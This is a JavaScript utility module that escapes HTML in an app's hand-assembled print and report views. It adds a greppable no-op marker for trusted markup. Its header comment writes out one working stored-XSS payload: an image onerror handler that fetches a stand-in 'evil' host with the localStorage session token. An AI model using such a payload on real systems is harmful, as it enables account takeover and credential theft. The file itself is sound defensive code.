// Escaping for the HTML strings the print/report builders assemble by hand.
//
// Every print view in this app builds a full HTML document as a template literal
// and hands it to `printWindow.document.write(...)`. That popup is same-origin
// with the app - window.open() inherits the opener's origin - so anything that
// executes in it runs with the session token sitting in localStorage, and can
// POST to the API as the user. Nothing in between was escaping anything:
//
//     <td>${user.username}</td>
//
// A username of `<img src=x onerror="fetch('//evil/?'+localStorage.user)">` is a
// complete account takeover, and it is *stored*: the name is in the database and
// renders in every report an admin prints. The same is true of client names, car
// names, notes, references, addresses - i.e. most of what these reports display.
//
// So the rule for the print builders is: escape at the interpolation, not at the
// source. These documents are assembled from dozens of places and there is no
// single render pass to sanitise at, so the value has to arrive already safe.
//
// The two functions below exist because "escape everything" is not an option
// either. These builders interpolate a lot of *trusted* markup on purpose:
// formatCurrency() returns styled spans, several tables pre-build <td> fragments
// in a .map() and interpolate the result. Escaping those would print the tags as
// literal text and break every report. So:
//
//   escapeHtml(v) - for text and attribute values. The default, always correct.
//   rawHtml(v)    - an identity function that does nothing, and exists purely to
//                   be greppable. It forces a human to say "this fragment is
//                   markup we built ourselves" at each site instead of leaving a
//                   bare ${...} that nobody can classify later. Anything passed
//                   here must not contain user data; if it might, it needs
//                   escaping before it gets here.

const HTML_ENTITIES = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#39;',
}

// Order is deliberate: `&` has to become `&amp;` first, or it would double-escape
// the ampersands this function itself introduces for the other four.
const HTML_ESCAPE_RE = /[&<>"']/g

/**
 * Escape a value for interpolation into HTML text or a quoted attribute.
 *
 * Safe for null/undefined (renders as empty, matching how a template literal
 * would have rendered it) and for non-strings, which are stringified first so
 * that a number or an object does not produce "[object Object]" *unescaped*.
 *
 * @param {unknown} value
 * @returns {string}
 */
export function escapeHtml(value) {
  if (value === null || value === undefined) {
    return ''
  }

  return String(value).replace(HTML_ESCAPE_RE, (char) => HTML_ENTITIES[char])
}

/**
 * Mark a fragment as trusted, pre-built markup.
 *
 * Returns its argument unchanged. This is a no-op at runtime and exists only so
 * the decision is visible and greppable:
 *
 *   grep -rn 'rawHtml(' src/
 *
 * Every call is a place where a reviewer has to confirm the string is markup the
 * app built, with no user data interpolated into it upstream.
 *
 * @template T
 * @param {T} value
 * @returns {T}
 */
export function rawHtml(value) {
  return value
}

export default escapeHtml
